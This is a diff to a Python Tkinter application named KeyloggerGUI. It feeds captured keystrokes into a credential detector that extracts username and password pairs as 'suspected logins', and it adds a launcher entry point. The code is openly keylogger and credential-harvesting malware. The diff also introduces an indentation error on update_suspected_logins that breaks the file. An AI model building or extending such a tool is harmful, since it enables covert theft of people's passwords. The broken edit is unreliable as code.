@@ -301,10 +301,10 @@ class KeyloggerGUI:
         # Clean up general functional system keys for clear logs (e.g., 'Key.shift' becomes 'shift')
         return str(key).replace("Key.", ""), False, False
 
-    def update_suspected_logins(self):
+        def update_suspected_logins(self):
         """Send internal logs into the detector module and update credentials display."""
-        # Check against your custom credential_detector instance logic
-        results = self.credential_detector.detect(self.captured_text)
+        
+        results = self.credential_detector.find_logins(self.captured_text)
         if results:
             for username, password in results:
                 login_pair = (username, password)
@@ -322,7 +322,6 @@ class KeyloggerGUI:
         self.captured_text = ""
         self.detected_logins.clear()
         
-        # Clear entries inside UI lists
         for item in self.keystroke_tree.get_children():
             self.keystroke_tree.delete(item)
         for item in self.login_tree.get_children():
@@ -332,7 +331,19 @@ class KeyloggerGUI:
         self.login_count_label.config(text="Suspected logins: 0")
         self.capture_entry.delete(0, tk.END)
 
-    def close_application(self):
-        """Close the application window."""
+    def close_application(self):    
+        """Close the application window and stop background hooks cleanly."""
         self.stop_logging()
         self.root.destroy()
+
+
+def main():
+    """Launch the desktop application."""
+    root = tk.Tk()
+    KeyloggerGUI(root)
+    root.mainloop()
+
+
+if __name__ == "__main__":
+    main()
+
